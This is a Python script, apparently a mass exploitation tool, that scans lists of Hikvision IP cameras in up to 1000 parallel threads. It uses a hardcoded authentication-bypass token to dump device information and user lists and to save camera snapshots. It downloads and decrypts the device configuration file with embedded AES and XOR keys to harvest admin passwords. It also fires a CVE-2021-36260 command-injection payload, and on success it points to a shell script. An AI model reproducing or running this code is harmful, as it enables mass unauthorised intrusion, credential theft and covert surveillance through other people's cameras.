#!/usr/bin/env python3
import requests
import os
import sys
import signal
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle
from Crypto.Cipher import AES
import xml.etree.ElementTree as ET

# ====== Configuration ======
CONCURRENCY = 1000  # Number of hosts in parallel
TIMEOUT = 3
TARGETS_FILE = "targets.txt"

# Paths for Hikvision
directory_path = "/onvif-http/snapshot?auth=YWRtaW46MTEK"
device_info_path = "/System/deviceInfo?auth=YWRtaW46MTEK"
user_info_path = "/Security/users?auth=YWRtaW46MTEK"
config_file_path = "/System/configurationFile?auth=YWRtaW46MTEK"

os.makedirs("logs", exist_ok=True)

class Color:
    RESET = "\033[0m"; RED = "\033[91m"; GREEN = "\033[92m"
    YELLOW = "\033[93m"; BLUE = "\033[94m"; CYAN = "\033[96m"


def print_banner():
    banner = f"""
{Color.GREEN}
============================================
██╗  ██╗██╗██╗  ██╗██╗   ██╗██╗███████╗██╗ ██████╗ ███╗   ██╗███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗
██║  ██║██║██║ ██╔╝██║   ██║██║██╔════╝██║██╔═══██╗████╗  ██║██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗
███████║██║█████╔╝ ██║   ██║██║███████╗██║██║   ██║██╔██╗ ██║█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝
██╔══██║██║██╔═██╗ ╚██╗ ██╔╝██║╚════██║██║██║   ██║██║╚██╗██║██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗
██║  ██║██║██║  ██╗ ╚████╔╝ ██║███████║██║╚██████╔╝██║ ╚████║███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝  ╚═══╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝

Contact me on:
Telegram : @HexBuddy127001
============================================
{Color.RESET}
"""
    print(banner)




# ========== AES + XOR decrypt ==========
def add_to_16(b): 
    return b + b'\0' * (16 - len(b) % 16) if len(b) % 16 else b

def decrypt(ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
    key = bytes.fromhex(hex_key)
    plaintext = AES.new(key, AES.MODE_ECB).decrypt(add_to_16(ciphertext))
    return plaintext.rstrip(b"\0")

def xore(data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

def strings(data_str):
    return re.findall(r"[A-Za-z0-9/\-:.,_$%'()[\]<> ]{2,}", data_str)

def decrypt_config_file(path):
    enc = open(path, 'rb').read()
    try:
        dec = decrypt(enc)
        xored = xore(dec)
        return strings(xored.decode('ISO-8859-1'))
    except:
        return []

# ========== Utils ==========
def safe_get(url, **kwargs):
    try:
        return requests.get(url, timeout=TIMEOUT, **kwargs)
    except:
        return None

def safe_post(url, **kwargs):
    try:
        return requests.post(url, timeout=TIMEOUT, **kwargs)
    except:
        return None

def section(buf, title):
    buf.append(f"\n{Color.CYAN}{title}{Color.RESET}")

def check_directory(ip_port, buf):
    url = f"http://{ip_port}{directory_path}"
    r = safe_get(url)
    if r and r.status_code == 200:
        buf.append(f"{Color.GREEN}[+] Directory accessible:{Color.RESET} {url}")
        return url
    return None

def fetch_xml(url):
    r = safe_get(url)
    if r and r.status_code == 200:
        try:
            return ET.fromstring(r.content)
        except:
            return None
    return None

def device_info(ip_port, buf):
    xml = fetch_xml(f"http://{ip_port}{device_info_path}")
    if xml:
        section(buf, "[+] Device Info")
        for ch in xml:
            buf.append(f"    {ch.tag.split('}')[-1]}: {ch.text}")

def user_info(ip_port, buf):
    xml = fetch_xml(f"http://{ip_port}{user_info_path}")
    if xml:
        section(buf, "[+] Users")
        for u in xml:
            n = u.find('.//{http://www.hikvision.com/ver10/XMLSchema}userName')
            l = u.find('.//{http://www.hikvision.com/ver10/XMLSchema}userLevel')
            if n is not None and l is not None:
                buf.append(f"    {n.text}: {l.text}")

def download_snapshot(url, folder, buf):
    r = safe_get(url)
    if r and r.status_code == 200:
        fn = os.path.join(folder, f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
        open(fn,'wb').write(r.content)
        buf.append(f"{Color.GREEN}[+] Snapshot saved:{Color.RESET} {fn}")

def fetch_and_decrypt_config(ip_port, folder, buf):
    url = f"http://{ip_port}{config_file_path}"
    r = safe_get(url)
    if r and r.status_code == 200:
        cfg = os.path.join(folder, "config_enc.bin")
        open(cfg,'wb').write(r.content)
        lines = decrypt_config_file(cfg)
        creds = []
        for idx, s in enumerate(lines):
            if s.lower() == "admin" and idx + 1 < len(lines):
                creds.append((s, lines[idx+1]))
        if creds:
            section(buf, "[!] User Creds Exposed!!")
            for u, p in creds:
                buf.append(f"    {Color.GREEN}{u}:{p}{Color.RESET}")

def check_cve_2021_36260(ip_port, buf):
    section(buf, "-- CVE-2021-36260 (RCE Command Injection Check) --")
    url = f"http://{ip_port}/Security/users"
    headers_list = [
        {"X-Original-URL": "/Security/users"},
        {"X-Rewrite-URL": "/Security/users"},
        {"User-Agent": "Mozilla"}
    ]
    for hdr in headers_list:
        r = safe_get(url, headers=hdr)
        if r and r.status_code == 200 and b"<userList>" in r.content:
            buf.append(f"    {Color.GREEN}VULNERABLE via header bypass{Color.RESET}")
            return
    # Command injection test from nuclei PoC
    put_url = f"http://{ip_port}/SDK/webLanguage"
    get_url = f"http://{ip_port}/x"
    payload = '<?xml version="1.0" encoding="UTF-8"?><language>$(echo Pwned_By_HexBuddy>webLib/x)</language>'
    try:
        requests.put(put_url,
                     headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
                     data=payload,
                     timeout=TIMEOUT)
        time.sleep(1)
        r2 = safe_get(get_url)
        if r2 and r2.status_code == 200 and b"Pwned_By_HexBuddy" in r2.content:
            buf.append(f"    {Color.GREEN}RCE confirmed! Device is VULNERABLE!!!{Color.RESET}")
            buf.append(f"    {Color.GREEN}Run this to get a shell: chmod +x shell.sh && ./shell.sh {ip_port}{Color.RESET}")
            return
    except:
        pass
    buf.append(f"    {Color.RED}Not vulnerable or exploit failed{Color.RESET}")


# ========== Host Worker ==========
def scan_host(ip_port):
    buf = []
    folder = f"logs/{ip_port.replace(':','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(folder, exist_ok=True)
    dir_url = check_directory(ip_port, buf)
    if not dir_url:
        return ""
    buf.insert(0, f"\n{'='*55}\nTarget: {ip_port}\n{'='*55}\n")
    device_info(ip_port, buf)
    user_info(ip_port, buf)
    download_snapshot(dir_url, folder, buf)
    fetch_and_decrypt_config(ip_port, folder, buf)
    check_cve_2021_36260(ip_port, buf)
    buf.append(f"\n{Color.GREEN}=== Done {ip_port} ==={Color.RESET}\n")
    return "\n".join(buf)

# ========== Main ==========
def main():
    signal.signal(signal.SIGQUIT, lambda s,f: sys.exit(0))
    print_banner()
    targets = [x.strip() for x in open(TARGETS_FILE) if x.strip()]
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as ex:
        futures = {ex.submit(scan_host, t): t for t in targets}
        for fut in as_completed(futures):
            result = fut.result()
            if result:
                print(result)

if __name__ == "__main__":
    main()
